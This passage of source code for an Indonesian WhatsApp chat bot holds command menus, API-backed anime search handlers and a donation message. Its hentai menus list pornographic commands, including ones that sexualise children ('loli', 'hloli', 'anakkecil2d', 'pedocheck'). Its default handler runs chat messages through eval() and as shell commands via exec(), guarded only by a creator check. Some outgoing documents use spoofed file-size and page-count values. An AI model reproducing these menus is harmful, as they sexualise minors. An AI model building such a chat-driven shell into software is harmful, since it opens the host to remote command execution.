│✑ ${prefix}ɴʜᴇɴᴛᴀɪsᴇᴀʀᴄʜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴏᴛᴀᴋᴜᴅᴇsᴜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}sᴄᴀɴɪᴍᴇ [ғᴏᴛᴏ]
│✑ ${prefix}xɴxxsᴇᴀʀᴄʜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}xɴxxᴅʟ [ʟɪɴᴋ]
│ғɪᴛᴜʀ sᴄᴀɴɪᴍᴇ sᴀᴍᴀ sᴇᴘᴇʀᴛɪ
│ᴡʜᴀᴛ ᴀɴɪᴍᴇ ɪs ᴛʜɪs (ᴛᴇʟᴇɢʀᴀᴍ)
│ᴋᴇɢᴜɴᴀᴀɴɴʏᴀ? ɴʏᴀʀɪ ᴊᴜᴅᴜʟ  
│ᴀɴɪᴍᴇ ʟᴇᴡᴀᴛ sᴇʙᴜᴀʜ ғᴏᴛᴏ
│   
│✑✑✑❀ ɢʀᴏᴜᴘ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ᴀɴᴛɪʟɪɴᴋ
│✑ ${prefix}ᴄʟɪɴᴋ [ᴜʙᴀʜʟɪɴᴋɢᴄ]
│✑ ${prefix}ᴅᴇʟᴇᴛᴇ [ʙᴀʟᴀs]
│✑ ${prefix}ʜɪᴅᴇᴛᴀɢ [ᴛᴇxᴛ]
│✑ ${prefix}ᴋɪᴄᴋ [ᴛᴀɢ/ʙᴀʟᴀs]
│✑ ${prefix}ᴍᴀsᴜᴋɪɴ [ɴᴏᴍᴏʀ]
│✑ ${prefix}ɴᴀɪᴋɪɴ [ᴛᴀɢ/ʙᴀʟᴀs]
│✑ ${prefix}sᴇᴛɴᴀᴍᴇ [ᴛᴇxᴛ]
│✑ ${prefix}sᴇᴛɢᴄᴘᴘ [ᴋɪʀɪᴍ ғᴏᴛᴏ]
│✑ ${prefix}sᴇᴛᴅᴇsᴄ [ᴛᴇxᴛ]
│✑ ${prefix}ᴛᴀɢᴀʟʟ [ᴛᴇxᴛ]
│✑ ${prefix}ᴛᴜʀᴜɴɪɴ [ᴛᴀɢ]
│
│✑✑✑❀ ᴛᴏʙᴀᴛ ᴍᴇɴᴜ ❀
│   
│✑ ${prefix}ɴɪᴀᴛsʜᴏʟᴀᴛ
│✑ ${prefix}ᴋɪsᴀʜɴᴀʙɪ [ɴᴀᴍᴀ]
│   
│✑✑✑❀ ɢᴀᴍᴇ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ᴄᴀᴋʟᴏɴᴛᴏɴɢ
│✑ ${prefix}ғᴀᴍɪʟʏ𝟷𝟶𝟶
│✑ ${prefix}ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
│✑ ${prefix}ᴛᴇʙᴀᴋᴋᴀʟɪᴍᴀᴛ
│✑ ${prefix}ᴛᴇʙᴀᴋᴋᴀᴛᴀ
│✑ ${prefix}sᴜɪᴛ [ᴛᴀɢ]
│
│✑✑✑❀ ғᴜɴ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ᴀʀᴛɪᴍɪᴍᴘɪ
│✑ ${prefix}ᴅᴀʀᴋᴊᴏᴋᴇ
│✑ ${prefix}ɢᴀʏᴄʜᴇᴄᴋ [ᴛᴀɢ]
│✑ ${prefix}ʜᴏʀɴʏᴄʜᴇᴄᴋ [ᴛᴀɢ]
│✑ ${prefix}ᴋᴀᴘᴀɴᴋᴀʜ [ᴛᴇxᴛ]
│✑ ${prefix}ᴋᴇʙᴇɴᴀʀᴀɴ
│✑ ${prefix}ᴘᴇᴅᴏᴄʜᴇᴄᴋ
│✑ ${prefix}ᴘᴏʀɴʜᴜʙ [ʟᴏɢᴏ]
│✑ ${prefix}ǫᴜᴏᴛᴇs
│✑ ${prefix}ʀᴇᴀᴋsɪ
│✑ ${prefix}sᴀʏ [ᴛᴇxᴛ]
│✑ ${prefix}ᴛᴀɴᴛᴀɴɢᴀɴ
│✑ ${prefix}ᴜɢʟʏᴄʜᴇᴄᴋ [ᴛᴀɢ]
│✑ ${prefix}ᴡᴀɴɢʏ [ᴛᴇxᴛ]
│
│✑✑✑❀ ʟɪsᴛ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ғɪʟᴍ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
│✑ ${prefix}ʟᴇᴡᴅ
│✑ ${prefix}ʟɪsᴛɢᴄ
│✑ ${prefix}ʟɪsᴛᴘᴄ
│✑ ${prefix}ᴘʀᴏғɪʟᴇ
│✑ ${prefix}ʀᴇǫᴜᴇsᴛ
│✑ ${prefix}sᴘᴇᴀᴋ [ᴛᴇxᴛ]
│✑ ${prefix}sᴄʀɪᴘᴛ
│✑ ${prefix}xɴxxsᴇᴀʀᴄʜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}xɴxxᴅʟ [ʟɪɴᴋ]
│
│✑✑✑❀ ᴏᴡɴᴇʀ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ʙᴀɴ
│✑ ${prefix}ʙᴀɴɢʀᴏᴜᴘ
│✑ ${prefix}ʙʟᴏᴄᴋ
│✑ ${prefix}ʙʀᴏᴀᴅᴄᴀsᴛ
│✑ ${prefix}ᴄᴏᴅᴇ𝟺𝟶𝟺
│✑ ${prefix}ᴊᴏɪɴ
│✑ ${prefix}ᴘᴜʙʟɪᴄ
│✑ ${prefix}sᴇʟғ
│✑ ${prefix}ᴜɴʙʟᴏᴄᴋ
│
│✑✑✑❀ ᴅᴏᴡɴʟᴏᴀᴅᴇʀ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ғʙ [ʟɪɴᴋ]
│✑ ${prefix}ɢᴏᴏɢʟᴇᴅʀɪᴠᴇ [ʟɪɴᴋ]
│✑ ${prefix}ᴋᴜsᴏɴɪᴍᴇ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴏᴛᴀᴋᴜᴅᴇsᴜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴘʟᴀʏ [ʟɪɴᴋ]
│✑ ${prefix}ᴍᴇᴅɪᴀғɪʀᴇ [ʟɪɴᴋ/ᴊᴜᴅᴜʟ]
│✑ ${prefix}ɴʜᴇɴᴛᴀɪ [ᴋᴏᴅᴇ]
│✑ ${prefix}ᴛᴡɪᴛᴛᴇʀ [ʟɪɴᴋ]
│
│✑✑✑❀ ᴄᴏᴠᴇʀᴛ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ᴇᴍᴏᴊɪ [ᴇᴍᴏᴛ]
│✑ ${prefix}ᴘᴀᴛʀɪᴄᴋ [sᴛɪᴋᴇʀ]
│✑ ${prefix}ʀᴇᴠᴇʀsᴇ [ᴀᴜᴅɪᴏ]
│✑ ${prefix}sᴛɪᴄᴋᴇʀ
│✑ ${prefix}ᴛᴏᴀᴜᴅɪᴏ [ᴋɪʀɪᴍ]
│✑ ${prefix}ᴛᴏɪᴍɢ [ʙᴀʟᴀs]
│✑ ${prefix}ᴛᴏʟᴇᴛᴛᴇʀ [ᴀɴɢᴋᴀ]
│✑ ${prefix}ᴛᴏᴠɪᴅᴇᴏ [ʙᴀʟᴀs]
│✑ ${prefix}ᴛᴏᴜʀʟ [ᴋɪʀɪᴍ]
│✑ ${prefix}ᴛᴏɢɪғ [ᴋɪʀɪᴍ]
│
│✑✑✑❀ ᴡɪʙᴜ ᴍᴇɴᴜ ❀
│
│✑ ${prefix}ᴀɴɪᴍᴇ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴀɴɪᴍᴇᴏɴɢᴏɪɴɢ
│✑ ${prefix}ᴀɴɪᴍᴇǫᴜᴏᴛᴇ
│✑ ${prefix}ᴀᴋɪʏᴀᴍᴀ
│✑ ${prefix}ᴀsᴜɴᴀ
│✑ ${prefix}ᴀᴡᴏᴏ
│✑ ${prefix}ᴄʜɪʜᴏ
│✑ ${prefix}ᴄʜɪᴛᴏɢᴇ
│✑ ${prefix}ᴄʀᴏsᴘʟᴀʏ
│✑ ${prefix}ᴅᴅʟᴀᴛᴇsᴛ [ᴅᴏᴜᴊɪɴ ᴅᴇsᴜ]
│✑ ${prefix}ᴇʟᴀɪɴᴀ
│✑ ${prefix}ғᴏxɢɪʀʟ
│✑ ${prefix}ɢʀᴇᴍᴏʀʏ
│✑ ${prefix}ɢᴀᴄʜᴀᴡᴀɪғᴜ
│✑ ${prefix}ɢᴜʀᴀsᴛɪᴄᴋᴇʀ
│✑ ${prefix}ʜᴇsᴛɪᴀ
│✑ ${prefix}ʜɪɴᴀᴛᴀ
│✑ ${prefix}ɪɴᴏʀɪ
│✑ ${prefix}ɪsᴜᴢᴜ
│✑ ${prefix}ᴋᴀᴏʀɪ
│✑ ${prefix}ᴋᴏᴛᴏʀɪ
│✑ ${prefix}ᴋᴜsᴏɴɪᴍᴇ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ʟᴏʟɪ
│✑ ${prefix}ᴍᴀɴɢᴀ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴍᴇɢᴜᴍɪɴ
│✑ ${prefix}ɴᴇᴋᴏ
│✑ ${prefix}ɴᴇᴋᴏᴘᴏɪ [ᴜᴘᴅᴀᴛᴇ]
│✑ ${prefix}ɴᴇᴢᴜᴋᴏ
│✑ ${prefix}ɴʜᴇɴᴛᴀɪ [ᴋᴏᴅᴇ]
│✑ ${prefix}ɴʜᴇɴᴛᴀɪᴘᴅғ [ᴋᴏᴅᴇ]
│✑ ${prefix}ɴʜᴇɴᴛᴀɪsᴇᴀʀᴄʜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴏᴛᴀᴋᴜᴅᴇsᴜ [ᴊᴜᴅᴜʟ]
│✑ ${prefix}ᴘᴘᴄᴏᴜᴘʟᴇ
│✑ ${prefix}ǫᴜᴏᴛᴇsᴀɴɪᴍᴇ
│✑ ${prefix}sᴀɢɪʀɪ
│✑ ${prefix}sᴄᴀɴɪᴍᴇ [ғᴏᴛᴏ]
│✑ ${prefix}sʜɪɴᴀ
│✑ ${prefix}sʜɪɴᴋᴀ
│✑ ${prefix}sʜɪɴᴏᴍɪʏᴀ
│✑ ${prefix}ᴛᴇᴊɪɴᴀ
│✑ ${prefix}ᴡᴀɪғᴜ [ᴛᴇxᴛ]
│✑ ${prefix}ᴡᴀʟʟᴘᴀᴘᴇʀ
│✑ ${prefix}ʏᴏᴛsᴜʙᴀ
│
│✑✑✑❀ ᴍᴇɴᴜ ʟᴀɪɴɴʏᴀ ❀
│
│✑ ${prefix}ᴄʜᴀɴɢᴇʟᴏɢ
│✑ ${prefix}ᴄᴏᴠɪᴅ
│✑ ${prefix}ғʟɪᴘᴛᴇxᴛ [ᴛᴇxᴛ]
│✑ ${prefix}ɢᴏᴏɢʟᴇ [ᴛᴇxᴛ]
│✑ ${prefix}ɢɪᴍᴀɢᴇ [ᴛᴇxᴛ]
│✑ ${prefix}ɢᴇᴍᴘᴀ
│✑ ${prefix}ʀᴇᴘᴏʀᴛ [ᴛᴇxᴛ]
│✑ ${prefix}ᴛʀᴀɴsʟᴀᴛᴇ
│✑ ${prefix}ᴛᴏʟᴇᴛᴛᴇʀ [ᴛᴇxᴛ]
│✑ ${prefix}ᴡɪᴋɪ [ᴛᴇxᴛ]
│
│✑✑✑❀ ʜᴇɴᴛᴀɪ ᴍᴇɴᴜ❀
│   
│✑ ${prefix}ʜᴇɴᴛᴀɪᴍᴇɴᴜ
│✑ ${prefix}ʜᴇɴᴛᴀɪᴍᴇɴᴜᴠ𝟸
│
│✑ ᴊᴀɴɢᴀɴ ᴅɪsᴘᴀᴍ ʏᴀ ᴏɴɪɪᴄʜᴀɴ!
│  
│        『  *${global.BotName}*  』
│✑ ʀᴇᴄᴏᴅᴇ : ʀɪ
│✑ ᴅᴇᴠᴇʟᴏᴘᴇʀ ʙᴏᴛ : ғᴀɴᴛᴏx
╰────────────────⊱
`
let buttonclog =  [
    {buttonId: `-clog`, buttonText: {displayText: 'ᴄʜᴀɴɢᴇʟᴏɢ!'}, type: 1},
    {buttonId: `-donatur`, buttonText: {displayText: 'ᴅᴏɴᴀᴛᴜʀ'}, type: 1}
    ]
let buttonMessage = {
	image:fs.readFileSync('./Assets/miunaa.jpg'),
	caption : text,
	buttons : buttonclog,
    footer : 'ᴍɪᴜɴᴀ',
    headerType : 4,
	}
let asukau = {
    document: fs.readFileSync('./Rimed/Ri.xlsx'),
	mimetype: docs,
	fileName: `ᴍɪᴜɴᴀ sʜɪᴏᴅᴏᴍᴇ`,
	fileLength: 99999999999999,
	pageCount : 69696969,
	caption : `ʟɪsᴛ ᴍᴇɴᴜ ᴛᴇʟᴀʜ ᴍɪᴜɴᴀ ᴋɪʀɪᴍᴋᴀɴ ᴍᴇʟᴀʟᴜɪ ᴘᴇsᴀɴ ᴘʀɪʙᴀᴅɪ/ᴘʀɪᴠᴀᴛᴇ ᴄʜᴀᴛ/ᴘᴍ.\nsɪʟᴀʜᴋᴀɴ ᴅɪᴄᴇᴋ!`,
    footer : 'ᴍɪᴜɴᴀ',
    headerType : 4,
    }
XeonBotInc.sendMessage(m.sender, buttonMessage)
await sleep(1000)
XeonBotInc.sendMessage(m.chat , asukau, {quoted : m})
}
	break



		case 'hentaimenu': case 'hlist': case 'hentailist':{
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
      
 const hentailist = `
╭───❲ ʜᴇɴᴛᴀɪ ᴍᴇɴᴜ ❳
│
│✑ ${prefix}ᴀss
│✑ ${prefix}ʙᴅsᴍ
│✑ ${prefix}ʙʟᴏᴡᴊᴏʙ
│✑ ${prefix}CweXCwe
│✑ ${prefix}ᴄᴏʟᴍᴇᴋ
│✑ ${prefix}ᴄᴜᴍ
│✑ ${prefix}ᴄᴜᴍsʟᴜᴛ
│✑ ${prefix}ᴄᴜᴄᴋᴏʟᴅ
│✑ ${prefix}ғᴇᴇᴛ
│✑ ${prefix}ɢᴇɴsʜɪɴɪᴍᴘᴀᴄᴛ
│✑ ${prefix}ɢᴀsᴍ
│✑ ${prefix}ɢᴀɴɢʙᴀɴɢ
│✑ ${prefix}ɢʟᴀssᴇs
│✑ ${prefix}ʜʟᴏʟɪ
│✑ ${prefix}ʜᴡᴀɪғᴜ
│✑ ${prefix}ʜᴇɴᴛᴀɪᴠɪᴅᴇᴏ
│✑ ${prefix}ʜɴᴇᴋᴏ 
│✑ ${prefix}ʜᴍɪᴋᴜ 
│✑ ${prefix}ɪᴋᴋᴜ 
│✑ ${prefix}ᴍᴇᴍᴇᴡ 
│✑ ${prefix}ᴍᴀɪᴅ 
│✑ ${prefix}ᴍᴀsᴛᴜʀʙᴀᴛɪᴏɴ 
│✑ ${prefix}ᴍsᴛʀʙ 
│✑ ${prefix}ɴʏᴇᴘᴏɴɢ 
│✑ ${prefix}ɴᴇᴛᴏʀᴀʀᴇ 
│✑ ${prefix}ᴏᴘᴘᴀɪ 
│✑ ${prefix}ᴏʀɢʏ 
│✑ ${prefix}ᴘᴀɴᴛᴀᴛ 
│✑ ${prefix}ᴘᴀɴᴛsᴜ
│✑ ${prefix}ᴘᴜssʏ 
│✑ ${prefix}ᴘᴀɴᴛɪᴇs 
│✑ ${prefix}sᴄʜᴏᴏʟ 
│✑ ${prefix}ᴛᴇɴᴛᴀᴄʟᴇs 
│✑ ${prefix}ᴛᴜsʙᴏʟ 
│✑ ${prefix}ᴛʀᴀᴘ 
│✑ ${prefix}ᴛʜɪɢʜs
│✑ ${prefix}ʏᴜʀɪ
│
│✑✑ ᴍɪᴜɴᴀ sʜɪᴏᴅᴏᴍᴇ
│
╰────────────────⊱
`
    

 let buttonsclogm = [
    {buttonId: `-dongnasi`, buttonText: {displayText: 'Req Genre? Donet dlu bang:v'}, type: 1}
    ]
                let buttonMessage = {
                    image:fs.readFileSync('./Assets/Hentailist.png'),
                    caption: hentailist,
                    footer: `${BotName}`,
                    buttons: buttonsclogm,
                    headerType: 4
                    
                }
            XeonBotInc.sendMessage(m.chat, buttonMessage,{ quoted:m })
                }
	break
	
	case 'hentaimenuv2': case 'hmv2':
    if (isBan) return reply(mess.banned)	 			
    if (isBanChat) return reply(mess.bangc)
    reply(`
╭──❲ ʜᴀɪ ᴋᴀᴋ *${pushname}* ❳
│
│✑ ${prefix}ᴀʜᴇɢᴀᴏ
│✑ ${prefix}ᴀɴɪᴍᴇᴛʜɪɢʜss
│✑ ${prefix}ᴀɴɪᴍᴇʙᴏᴏᴛʏ
│✑ ${prefix}ᴀɴɪᴍᴇғᴇᴇᴛs
│✑ ${prefix}ᴀɴᴀᴋᴋᴇᴄɪʟ𝟸ᴅ 
│✑ ${prefix}ʙɪɢᴀɴɪᴍᴇᴛɪᴅᴅɪᴇs
│✑ ${prefix}ᴄʀᴏᴛ
│✑ ${prefix}ᴄʜɪɪsᴀɪʜᴇɴᴛᴀɪ
│✑ ${prefix}ᴇᴄᴄʜɪ
│✑ ${prefix}ғᴇᴍᴅᴏᴍ
│✑ ${prefix}ғᴇᴛɪsʜᴋᴀᴋɪ
│✑ ${prefix}ʜᴇɴᴛᴀʏ
│✑ ${prefix}ʜᴏʟᴏᴇʀᴏ
│✑ ${prefix}ʜᴏʟᴏʟᴇᴡᴅ
│✑ ${prefix}ʜᴇɴᴛᴀɪᴘᴀʀᴀᴅɪsᴇ
│✑ ${prefix}ʜᴇɴᴛᴀɪ𝟺ᴇᴠᴇʀʏᴏɴᴇ
│✑ ${prefix}ᴋᴇᴛᴇᴄ
│✑ ${prefix}ʟɪᴡᴇᴅ
│✑ ${prefix}ʟᴇᴡᴅᴀɴɪᴍᴇɢɪʀʟs
│✑ ${prefix}ʟʏᴄᴏʀɪs
│✑ ${prefix}ᴍɪʟғᴜ
│✑ ${prefix}ɴᴜɴ
│✑ ${prefix}ᴘᴀɴᴛᴀᴛ𝟸ᴅ
│✑ ${prefix}sʜᴏᴛᴀ
│✑ ${prefix}sʟᴜʀᴘ (ʙʟᴏᴡᴊᴏʙ)
│✑ ${prefix}sɪᴅᴇᴏᴘᴘᴀɪ
│✑ ${prefix}sᴘʏxғᴀᴍɪʟʏ
│✑ ${prefix}ʏᴜʀɪᴍᴇsᴜᴍ
│
│✑✑ ᴍɪᴜɴᴀ sʜɪᴏᴅᴏᴍᴇ
│
╰─────────────────⊱
`)
                
	break
	
  case 'otakudesu' : {
  if (!isMod) return reply(mess.mod)
  if (!args[0]) return reply(`Anuu , Judulnya?`)
  reply(mess.waiting)
  await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolkey}&query=${args.join(" ")}`).then((res) =>{
let sections = []   
  for (let i of res.result.link_dl) {
  for (let k of i.link_dl) {
  const list = {title: `${i.title}`,
  rows: [
	    {
	     title: `ʀᴇsᴏ : ${k.reso}     sɪᴢᴇ : ${k.size}`, 
	     rowId: `${prefix}otsus ᴊᴜᴅᴜʟ : ${i.title}\nʀᴇsᴏʟᴜsɪ : ${k.reso}\nᴢɪᴘᴘʏsʜᴀʀᴇ : ${k.link_dl.ZippyShare}\n\nHxfile : ${k.link_dl.Hxfile}\n\nᴅᴇsᴜғɪʟᴇs : ${k.link_dl.DesuFiles}\n\nᴍᴇɢᴀ : ${k.link_dl.Mega}\n\nᴅᴇsᴜᴅʀɪᴠᴇ  : ${k.link_dl.DesuDrive}\n\nᴏᴛᴀᴋᴜᴅʀɪᴠᴇ : ${k.link_dl.OtakuDrive}`
	    }, 
	    ]
     }
     sections.push(list)   
     }
     }
  const sendm =  XeonBotInc.sendMessage(
      from, 
      {
       text: `OtakuDesu!`,
       buttonText: `Hasil Pencarian!`,
       sections
      }, { quoted : m }
    )  
})
  }
  break
  
case 'otsus':{
if (!isMod) return reply (mess.mod)
reply(args.join(" "))
}
break	

case 'aog': case 'animeongoing':{
if (!isMod) return reply(mess.mod)
await fetchJson(`https://api.lolhuman.xyz/api/neonimelatest?apikey=${lolkey}`).then((res) =>{
let sections = []   
  for (let i of res.result) {
  const list = {title: `${i.title}`,
  rows: [
	    {
	     title: `Episode : ${i.episode}`, 
	     rowId: `${prefix}mir ᴊᴜᴅᴜʟ : ${i.title} \nᴛᴀɴɢɢᴀʟ ʀɪʟɪs : ${i.date}\nsᴛʀᴇᴀᴍɪɴɢ/ᴅᴏᴡɴʟᴏᴀᴅ : ${i.link}\n\nᴇᴘɪsᴏᴅᴇ : ${i.episode}\nsɪɴᴏᴘsɪs : ${i.desc}|${i.thumbnail}`,
	     description: `${i.date}`
	    }, 
	    ]
     }
     sections.push(list)   
     }
  const sendm =  XeonBotInc.sendMessage(
      from, 
      {
       text: `Neonime Latest`,
       buttonText: `Lihat Update!`,
       sections
      }, { quoted : m }
    )  
})
}
break




case 'mir':{
if (!isMod) return reply (mess.mod)
let teks = q.split('|')[0] ? q.split('|')[0] : q
let thumb = q.split('|')[1] ? q.split('|')[1] : q
let buttonMessage ={
image : {url : thumb},
caption : `${teks}`,
headerType : 1
}
XeonBotInc.sendMessage(from, buttonMessage,{quoted : m})
}
break
case 'dongnasi': case 'donasi': case 'donate':{
 let teks = `ᴏᴠᴏ/ᴅᴀɴᴀ/ɢᴏᴘᴀʏ : 085161888973\nsᴀʏᴀ ᴀᴋᴀɴ sᴀɴɢᴀᴛ ᴛᴇʀʙᴀɴᴛᴜ ᴊɪᴋᴀ ᴀɴᴅᴀ ᴍᴇᴍʙᴇʀɪ sᴇᴅɪᴋɪᴛ ʀᴇᴢᴇᴋɪ ᴀɴᴅᴀ ᴋᴇᴘᴀᴅᴀ sᴀʏᴀ. ᴛᴇʀɪᴍᴀ ᴋᴀsɪʜ 🙏 `
 let dongnasi = {
document: fs.readFileSync('./Rimed/Ri.xlsx'),
mimetype: docs,
fileName: `ᴛᴇʀɪᴍᴀ ᴋᴀsɪʜ ᴛᴇʟᴀʜ ʙᴇʀᴅᴏɴᴀsɪ`,
fileLength: 99999999999999,
pageCount : 69696969,
text : teks,
footer : 'ᴍɪᴜɴᴀ sʜɪᴏᴅᴏᴍᴇ',
headerType: 4
}
XeonBotInc.sendMessage(m.chat, dongnasi,{quoted :m}) 
 }
 break	     
        default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            reply(bang)
                    }
                    try {
                        reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
                    } catch (e) {
                        reply(String(e))
                    }
                }

                if (budy.startsWith('>')) {
                    if (!isCreator) return reply(mess.owner)
                    try {
                        let evaled = await eval(budy.slice(2))
                        if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
                        await reply(evaled)
                    } catch (err) {
                        await reply(String(err))
                    }
                }

                if (budy.startsWith('$')) {
                    if (!isCreator) return reply(mess.owner)
                    exec(budy.slice(2), (err, stdout) => {
                        if(err) return reply(err)
                        if (stdout) return reply(stdout)
                    })
                }
			
		if (m.chat.endsWith('@s.whatsapp.net') && isCmd) {
                    this.anonymous = this.anonymous ? this.anonymous : {}
                    let room = Object.values(this.anonymous).find(room => [room.a, room.b].includes(m.sender) && room.state === 'CHATTING')
                    if (room) {
                        if (/^.*(next|leave|start)/.test(m.text)) return
                        if (['.next', '.leave', '.stop', '.start', 'Cari Partner', 'Keluar', 'Lanjut', 'Stop'].includes(m.text)) return
                        let other = [room.a, room.b].find(user => user !== m.sender)
                        m.copyNForward(other, true, m.quoted && m.quoted.fromMe ? {
                            contextInfo: {
                                ...m.msg.contextInfo,
                                forwardingScore: 0,
                                isForwarded: true,
                                participant: other
                            }
                        } : {})
                    }
                    return !0
                }
/*			//anti-tag
const listTag = [`${global.ownertag}@s.whatsapp.net`]
const partiNum = (m.mtype === 'extendedTextMessage') ? m.message.extendedTextMessage.contextInfo.participant : ''
//anti-tag 2
if (listTag.includes(partiNum)) {
if (antitags === false) return
if (!m.isGroup) return
if (m.key.fromMe) return
sendNye = fs.readFileSync('./XeonMedia/theme/yourtag.webp')
XeonBotInc.sendReadReceipt(m.chat, m.sender, [m.key.id])
XeonBotInc.sendMessage(from, {sticker:sendNye, contextInfo:{forwardingScore: 800, isForwarded: true}}, {quoted:m})
}
//anti-tag 3
if (budy.includes(`${global.ownertag}`)) {
if (antitags === false) return
if (!m.isGroup) return
if (m.key.fromMe) return
sendNye = fs.readFileSync('./XeonMedia/theme/yourtag.webp')
XeonBotInc.sendReadReceipt(m.chat, m.sender, [m.key.id])
XeonBotInc.sendMessage(from, {sticker:sendNye, contextInfo:{forwardingScore: 800, isForwarded: true}}, {quoted:m})
}*/
		if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.data.database
		    if (!(budy.toLowerCase() in msgs)) return
		    XeonBotInc.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
		}
        }
        

    } catch (err) {
        m.reply(util.format(err))
    }
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
	fs.unwatchFile(file)
	console.log(chalk.redBright(`Update ${__filename}`))
	delete require.cache[file]
	require(file)
})
